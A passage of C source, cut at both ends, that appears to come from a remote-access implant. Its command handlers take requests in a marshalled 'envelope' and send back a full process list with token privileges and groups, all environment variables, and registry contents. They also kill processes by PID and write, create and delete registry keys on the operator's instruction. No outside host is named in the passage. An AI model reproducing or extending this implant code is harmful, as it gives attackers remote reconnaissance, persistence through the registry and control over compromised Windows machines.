			pElementList2 = REALLOC(pElementList2, sizeof(PPBElement) * cElementList2);
		}

		SecureZeroMemory(pProcessElements, sizeof(pProcessElements));
		pBasicInfo = GetProcessBasicInfo(hProc);
		lpTempStr = GetProcessImageFileNameWin32(hProc);
		lpImagePath = DuplicateStrA(lpTempStr, 0);
		pProcessElements[0] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 1);
		FREE(lpTempStr);

		lpTempStr = GetProcessCommandLine(hProc);
		pProcessElements[1] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 2);
		FREE(lpTempStr);

		lpTempStr = GetProcessCurrentDirectory(hProc);
		pProcessElements[2] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 3);
		FREE(lpTempStr);

		pProcessElements[3] = CreateVarIntElement((UINT64)pProcessInfo->UniqueProcessId, 4);
		pProcessElements[4] = CreateVarIntElement((UINT64)pBasicInfo->InheritedFromUniqueProcessId, 5);

		lpTempStr = DescribeProcessMitigation(hProc);
		pProcessElements[5] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 6);
		FREE(lpTempStr);

		pImageVersion = GetImageVersion(lpImagePath);
		if (pImageVersion != NULL) {
			if (pImageVersion->lpVersion != NULL) {
				pProcessElements[6] = CreateBytesElement(pImageVersion->lpVersion, lstrlenA(pImageVersion->lpVersion), 7);
			}

			if (pImageVersion->lpCompanyName != NULL) {
				pProcessElements[7] = CreateBytesElement(pImageVersion->lpCompanyName, lstrlenA(pImageVersion->lpCompanyName), 8);
			}

			if (pImageVersion->lpImageDesc != NULL) {
				pProcessElements[8] = CreateBytesElement(pImageVersion->lpImageDesc, lstrlenA(pImageVersion->lpImageDesc), 9);
			}

			if (pImageVersion->lpProductName != NULL) {
				pProcessElements[9] = CreateBytesElement(pImageVersion->lpProductName, lstrlenA(pImageVersion->lpProductName), 10);
			}
		}

		dwArch = GetImageArchitecture(lpImagePath);
		if (dwArch == IMAGE_FILE_MACHINE_I386) {
			pProcessElements[10] = CreateVarIntElement(TRUE, 11);
		}
		else if (dwArch == IMAGE_FILE_MACHINE_AMD64) {
			pProcessElements[10] = CreateVarIntElement(FALSE, 11);
		}

		hToken = NULL;
		if (OpenProcessToken(hProc, TOKEN_READ, &hToken)) {
			pTokenInfo = GetTokenInfo(hProc);
			if (pTokenInfo != NULL) {
				SecureZeroMemory(pTokenElements, sizeof(pTokenElements));
				pTokenElements[2] = CreateVarIntElement(pTokenInfo->dwSession, 3);
				pTokenElements[3] = CreateBytesElement(pTokenInfo->lpUserName, lstrlenA(pTokenInfo->lpUserName), 4);
				if (pUnmarshalledPid != NULL) {
					pTokenElements[0] = CreateVarIntElement(pTokenInfo->IsElevated, 1);
					lpTempStr = DuplicateStrA(ElevationDescs[pTokenInfo->ElevationType + (pTokenInfo->IsElevated ? 4 : 0)], 0);
					pTokenElements[1] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 2);
					FREE(lpTempStr);

					pTokenElements[4] = CreateBytesElement(pTokenInfo->lpUserSID, lstrlenA(pTokenInfo->lpUserSID), 5);
					pTokenElements[5] = CreateBytesElement(pTokenInfo->lpIntegrityLevel, lstrlenA(pTokenInfo->lpIntegrityLevel), 6);
					pElementList = ALLOC(pTokenInfo->pPrivileges->PrivilegeCount * sizeof(PPBElement));
					for (i = 0; i < pTokenInfo->pPrivileges->PrivilegeCount; i++) {
						SecureZeroMemory(PrivilegeElements, sizeof(PrivilegeElements));
						for (j = 0; j < _countof(PrivilegeElements); j++) {
							PrivilegeElements[j] = ALLOC(sizeof(PBElement));
							PrivilegeElements[j]->dwFieldIdx = j + 1;
						}

						dwTemp = 0x40;
						lpTempStr = ALLOC(dwTemp);
						LookupPrivilegeNameA(NULL, &pTokenInfo->pPrivileges->Privileges[i].Luid, lpTempStr, &dwTemp);
						PrivilegeElements[0] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 1);
						FREE(lpTempStr);

						dwPrivilegeAttr = pTokenInfo->pPrivileges->Privileges[i].Attributes;
						if (dwPrivilegeAttr & SE_PRIVILEGE_ENABLED) {
							if (dwPrivilegeAttr & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
								PrivilegeElements[1] = CreateBytesElement("Enabled", lstrlenA("Enabled"), 2);
							}
							else {
								PrivilegeElements[1] = CreateBytesElement("Enabled (modified)", lstrlenA("Enabled (modified)"), 2);
							}
						}
						else {
							if (dwPrivilegeAttr & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
								PrivilegeElements[1] = CreateBytesElement("Disabled (modified)", lstrlenA("Disabled (modified)"), 2);
							}
							else {
								PrivilegeElements[1] = CreateBytesElement("Disabled", lstrlenA("Disabled"), 2);
							}
						}

						pElementList[i] = CreateStructElement(PrivilegeElements, _countof(PrivilegeElements), 0);
					}

					pTokenElements[6] = CreateRepeatedStructElement(pElementList, pTokenInfo->pPrivileges->PrivilegeCount, 7);
					FREE(pElementList);
					pElementList = ALLOC(pTokenInfo->dwGroupCount * sizeof(PPBElement));
					for (i = 0; i < pTokenInfo->dwGroupCount; i++) {
						SecureZeroMemory(pTokenGroupElements, sizeof(pTokenGroupElements));
						for (j = 0; j < 5; j++) {
							pTokenGroupElements[j] = ALLOC(sizeof(PBElement));
							pTokenGroupElements[j]->dwFieldIdx = j + 1;
						}

						pGroupInfo = &pTokenInfo->pTokenGroupsInfo[i];
						pTokenGroupElements[0] = CreateBytesElement(pGroupInfo->szName, lstrlenA(pGroupInfo->szName), 1);
						pTokenGroupElements[1] = CreateBytesElement(pGroupInfo->szStatus, lstrlenA(pGroupInfo->szStatus), 2);
						pTokenGroupElements[2] = CreateBytesElement(pGroupInfo->szSID, lstrlenA(pGroupInfo->szSID), 3);
						pTokenGroupElements[3] = CreateBytesElement(pGroupInfo->szDesc, lstrlenA(pGroupInfo->szDesc), 4);
						pTokenGroupElements[4] = CreateBytesElement(pGroupInfo->szMandatoryLabel, lstrlenA(pGroupInfo->szMandatoryLabel), 5);

						pElementList[i] = CreateStructElement(pTokenGroupElements, _countof(pTokenGroupElements), 0);
					}

					pTokenElements[7] = CreateRepeatedStructElement(pElementList, pTokenInfo->dwGroupCount, 8);
					FREE(pElementList);
				}
				
				pProcessElements[11] = CreateStructElement(pTokenElements, _countof(pTokenElements), 12);
			}
		}

		pElementList2[dwIdx++] = CreateStructElement(pProcessElements, _countof(pProcessElements), 0);
		CloseHandle(hProc);
		FREE(lpImagePath);
		FreeImageVersion(pImageVersion);
		FreeTokenInfo(pTokenInfo);
		FREE(pBasicInfo);
	} while (pProcessInfo = PH_NEXT_PROCESS(pProcessInfo));

	pFinalElement = CreateRepeatedStructElement(pElementList2, dwIdx, 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (pUnmarshalledPid != NULL) {
		FREE(pUnmarshalledPid);
	}

	if (pReceivedElement != NULL) {
		FREE(pReceivedElement);
	}

	if (pElementList2 != NULL) {
		FREE(pElementList2);
	}

	if (pProcesses != NULL) {
		FREE(pProcesses);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE TerminateHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[2];
	DWORD i = 0;
	PUINT64 UnmarshalledData = NULL;
	PPBElement pFinalElement = NULL;
	DWORD dwPid = 0;
	BOOL Force = FALSE;
	HANDLE hProcess = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Varint;
	}

	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	dwPid = UnmarshalledData[0];
	hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
	if (hProcess == NULL) {
		LOG_ERROR("OpenProcess", GetLastError());
		goto CLEANUP;
	}

	if (!TerminateProcess(hProcess, 0)) {
		LOG_ERROR("TerminateProcess", GetLastError());
		goto CLEANUP;
	}

	pFinalElement = CreateVarIntElement(dwPid, 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (UnmarshalledData != NULL) {
		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hProcess != NULL) {
		CloseHandle(hProcess);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE GetEnvHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement* pElementList = NULL;
	PPBElement ElementList2[2];
	PPBElement pElement = NULL;
	PPBElement pFinalElement = NULL;
	DWORD cElementList = 0x100;
	PBUFFER* pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	LPWSTR lpEnvList = NULL;
	LPSTR lpKey = NULL;
	LPSTR lpValue = NULL;
	LPWSTR lpTemp = NULL;
	DWORD cEnvList = 0;
	DWORD cbValue = 0;
	DWORD dwNeededSize = 0;

	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;
	
	pElementList = ALLOC(cElementList * sizeof(PBElement));
	SecureZeroMemory(ElementList2, sizeof(ElementList2));
	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (pTemp == NULL) {
		lpEnvList = GetEnvironmentStringsW();
		while (TRUE) {
			if (lpEnvList[0] != L'=') {
				break;
			}

			lpEnvList += lstrlenW(lpEnvList);
			lpEnvList++;
		}

		lpTemp = lpEnvList;
		while (TRUE) {
			if (lpTemp[0] == L'\0') {
				break;
			}

			lpKey = ConvertWcharToChar(lpTemp);
			lpTemp += lstrlenW(lpTemp) + 1;
			lpValue = StrChrA(lpKey, '=');
			lpValue[0] = '\0';
			lpValue++;
			if (cEnvList >= cElementList) {
				cElementList = 2 * cEnvList;
				pElementList = REALLOC(pElementList, cElementList * sizeof(PBElement));
			}

			ElementList2[0] = CreateBytesElement(lpKey, lstrlenA(lpKey), 1);
			ElementList2[1] = CreateBytesElement(lpValue, lstrlenA(lpValue), 2);
			FREE(lpKey);
			pElementList[cEnvList++] = CreateStructElement(ElementList2, _countof(ElementList2), 0);
		}

		pFinalElement = CreateRepeatedStructElement(pElementList, cEnvList, 1);
	}
	else {
		lpKey = pTemp[0]->pBuffer;
		cbValue = 0x400;
		lpValue = ALLOC(cbValue);
		dwNeededSize = GetEnvironmentVariableA(lpKey, lpValue, cbValue);
		if (lstrlenA(lpValue) == 0) {
			lpValue = REALLOC(lpValue, dwNeededSize + 1);
			GetEnvironmentVariableA(lpKey, lpValue, dwNeededSize + 1);
		}

		ElementList2[0] = CreateBytesElement(lpKey, lstrlenA(lpKey), 1);
		ElementList2[1] = CreateBytesElement(lpValue, lstrlenA(lpValue), 2);
		pElementList[0] = CreateStructElement(ElementList2, _countof(ElementList2), 0);
		pFinalElement = CreateRepeatedStructElement(pElementList, 1, 1);
		FREE(lpValue);
	}

	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	FreeElement(pFinalElement);
	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpEnvList != NULL) {
		FreeEnvironmentStringsW(lpEnvList);
	}

	FreeElement(pElement);
	return pRespEnvelope;
}

PENVELOPE RegistryReadHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[3];
	DWORD i = 0;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpValueName = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	DWORD dwValueType = 0;
	DWORD cbData = 0;
	PBYTE pData = NULL;
	LPSTR lpFormattedValue = NULL;
	LPSTR lpTemp = NULL;
	DWORD cbFormattedValue = 0x400;
	DWORD dwPos = 0;
	PPBElement pFinalElement = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
	lpValueName = DuplicateStrA(UnmarshalledData[2]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}
	
	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpValueName);
	Status = RegOpenKeyExA(hRootKey, lpTemp, 0, KEY_READ, &hKey);
	if (Status == ERROR_FILE_NOT_FOUND) {
		FREE(lpTemp);
		Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
	}
	else if (Status == ERROR_SUCCESS) {
		FREE(lpPath);
		lpPath = lpTemp;
		FREE(lpValueName);
		lpValueName = NULL;
	}
	
	lpTemp = NULL;
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegGetValueA(hKey, NULL, lpValueName, RRF_RT_ANY, &dwValueType, NULL, &cbData);
	if (Status != ERROR_SUCCESS) {
		if (Status == ERROR_FILE_NOT_FOUND) {
			if (lpValueName == NULL) {
				pData = DuplicateStrA("(value not set)", 0);
			}
			else {
				pData = DuplicateStrA("Registry path not found", 0);
			}

			dwValueType = REG_SZ;
		}
		else {
			LOG_ERROR("RegGetValueA", Status);
			goto CLEANUP;
		}
	}
	else {
		cbData += 2;
		pData = ALLOC(cbData);
		Status = RegGetValueA(hKey, NULL, lpValueName, RRF_RT_ANY, &dwValueType, pData, &cbData);
		if (Status != ERROR_SUCCESS) {
			LOG_ERROR("RegGetValueA", Status);
			goto CLEANUP;
		}
	}

	if (dwValueType == REG_BINARY) {
		lpFormattedValue = ALLOC(cbFormattedValue);
		dwPos = 1;
		lpFormattedValue[0] = '[';
		for (i = 0; i < cbData; i++) {
			if (dwPos + 10 >= cbFormattedValue) {
				cbFormattedValue = dwPos * 2;
				lpFormattedValue = REALLOC(lpFormattedValue, cbFormattedValue);
			}

			dwPos += wsprintfA(&lpFormattedValue[dwPos], "%d ", pData[i]);
		}

		lpFormattedValue[dwPos - 1] = ']';
	}
	else if (dwValueType == REG_SZ || dwValueType == REG_EXPAND_SZ) {
		lpFormattedValue = DuplicateStrA(pData, 0);
	}
	else if (dwValueType == REG_DWORD || dwValueType == REG_QWORD) {
		lpFormattedValue = ALLOC(0x20);
		if (dwValueType == REG_DWORD) {
			wsprintfA(lpFormattedValue, "0x%08x", *((PDWORD)(pData)));
		}
		else {
			wsprintfA(lpFormattedValue, "0x%08IX", *((PQWORD)(pData)));
		}
	}
	else if (dwValueType == REG_MULTI_SZ) {
		lpFormattedValue = ALLOC(cbData + 1);
		memcpy(lpFormattedValue, pData, cbData);
		lpTemp = lpFormattedValue;
		while (TRUE) {
			if (lpTemp >= lpFormattedValue + cbData || lpTemp[0] == '\0') {
				break;
			}

			lpTemp += lstrlenA(lpTemp);
			lpTemp[0] = '\n';
			lpTemp++;
		}
	}
	else {
		LogError(L"Invalid value type\n");
		goto CLEANUP;
	}

	pFinalElement = CreateBytesElement(lpFormattedValue, lstrlenA(lpFormattedValue), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshalledData[i]);
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (pData != NULL) {
		FREE(pData);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpFormattedValue != NULL) {
		FREE(lpFormattedValue);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (lpValueName != NULL) {
		FREE(lpValueName);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE RegistryWriteHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[10];
	DWORD i = 0;
	LPVOID* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpValueName = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	LPSTR lpTemp = NULL;
	PPBElement pFinalElement = NULL;
	DWORD dwValueType = 0;
	PBYTE pValue = NULL;
	DWORD cbValue = 0;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	RecvElementList[6]->Type = Varint;
	RecvElementList[7]->Type = Varint;
	RecvElementList[9]->Type = Varint;
	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL || UnmarshalledData[2] == NULL) {
		goto CLEANUP;
	}

	dwValueType = (DWORD)UnmarshalledData[9];
	if (dwValueType == 1) {
		if (UnmarshalledData[5] == NULL) {
			goto CLEANUP;
		}

		cbValue = ((PBUFFER)UnmarshalledData[5])->cbBuffer;
		pValue = ALLOC(cbValue);
		memcpy(pValue, ((PBUFFER)UnmarshalledData[5])->pBuffer, cbValue);
		dwValueType = REG_BINARY;
	}
	else if (dwValueType == 3) {
		cbValue = sizeof(DWORD);
		pValue = ALLOC(cbValue);
		memcpy(pValue, &UnmarshalledData[6], cbValue);
		dwValueType = REG_DWORD;
	}
	else if (dwValueType == 4) {
		cbValue = sizeof(QWORD);
		pValue = ALLOC(cbValue);
		memcpy(pValue, &UnmarshalledData[7], cbValue);
		dwValueType = REG_QWORD;
	}
	else if (dwValueType == 2) {
		if (UnmarshalledData[4] == NULL) {
			goto CLEANUP;
		}

		cbValue = ((PBUFFER)UnmarshalledData[4])->cbBuffer + 1;
		pValue = ALLOC(cbValue);
		memcpy(pValue, ((PBUFFER)UnmarshalledData[4])->pBuffer, cbValue);
		dwValueType = REG_SZ;
	}

	lpHive = DuplicateStrA(((PBUFFER)UnmarshalledData[0])->pBuffer, 0);
	lpPath = DuplicateStrA(((PBUFFER)UnmarshalledData[1])->pBuffer, 0);
	lpValueName = DuplicateStrA(((PBUFFER)UnmarshalledData[2])->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpValueName);
	Status = RegOpenKeyExA(hRootKey, lpTemp, 0, KEY_WRITE, &hKey);
	if (Status == ERROR_FILE_NOT_FOUND) {
		FREE(lpTemp);
		Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_WRITE, &hKey);
	}
	else if (Status == ERROR_SUCCESS) {
		FREE(lpPath);
		lpPath = lpTemp;
		FREE(lpValueName);
		lpValueName = NULL;
		if (dwValueType != REG_SZ) {
			LogError("Cannot assign this registry type to default key value\n");
			goto CLEANUP;
		}
	}

	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegSetValueExA(hKey, lpValueName, 0, dwValueType, pValue, cbValue);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegSetValueExA", Status);
		goto CLEANUP;
	}

	pFinalElement = CreateStructElement(NULL, 0, 9);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			if (RecvElementList[i]->Type != Varint) {
				FreeBuffer(UnmarshalledData[i]);
			}
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (lpValueName != NULL) {
		FREE(lpValueName);
	}

	if (pValue != NULL) {
		FREE(pValue);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE RegistryCreateKeyHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[3];
	DWORD i = 0;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpKeyName = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	LPSTR lpTemp = NULL;
	PPBElement pFinalElement = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL || UnmarshalledData[2] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
	lpKeyName = DuplicateStrA(UnmarshalledData[2]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpKeyName);
	Status = RegCreateKeyA(hRootKey, lpTemp, &hKey);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegCreateKeyA", Status);
		goto CLEANUP;
	}
	
	pFinalElement = CreateStructElement(NULL, 0, 9);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (UnmarshalledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshalledData[i]);
		}

		FREE(UnmarshalledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (lpHive != NULL) {
		FREE(lpHive);
	}

	if (lpKeyName != NULL) {
		FREE(lpKeyName);
	}

	if (lpTemp != NULL) {
		FREE(lpTemp);
	}

	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE RegistryDeleteKeyHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pRespEnvelope = NULL;
	PPBElement RecvElementList[3];
	DWORD i = 0;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpValueName = NULL;
	LPSTR lpKeyName = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	LPSTR lpTemp = NULL;
	PPBElement pFinalElement = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshalledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshalledData[0] == NULL || UnmarshalledData[1] == NULL || UnmarshalledData[2] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshalledData[1]->pBuffer, 0);
	lpValueName = DuplicateStrA(UnmarshalledData[2]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpValueName);
	Status = RegOpenKeyExA(hRootKey, lpTemp, 0, KEY_QUERY_VALUE, &hKey);
	if (Status == ERROR_SUCCESS) {
		lpKeyName = lpValueName;
		lpValueName = NULL;
	}
	else if (Status != ERROR_FILE_NOT_FOUND) {
		LOG_ERROR("RegOpenKeyExA", Status);
